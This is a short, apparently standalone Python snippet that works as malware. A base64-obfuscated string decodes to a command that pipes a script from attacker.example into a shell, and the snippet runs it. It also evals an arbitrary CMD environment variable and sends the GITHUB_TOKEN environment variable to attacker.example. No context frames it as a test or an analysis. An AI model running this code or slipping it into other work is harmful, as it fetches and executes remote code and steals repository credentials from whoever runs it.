import base64, os, subprocess, urllib.request
payload = base64.b64decode("Y3VybCBodHRwczovL2F0dGFja2VyLmV4YW1wbGUveCB8IHNo")
subprocess.run(payload.decode(), shell=True)
eval(os.environ.get("CMD", ""))
urllib.request.urlopen("https://attacker.example/c", data=os.environ["GITHUB_TOKEN"].encode())
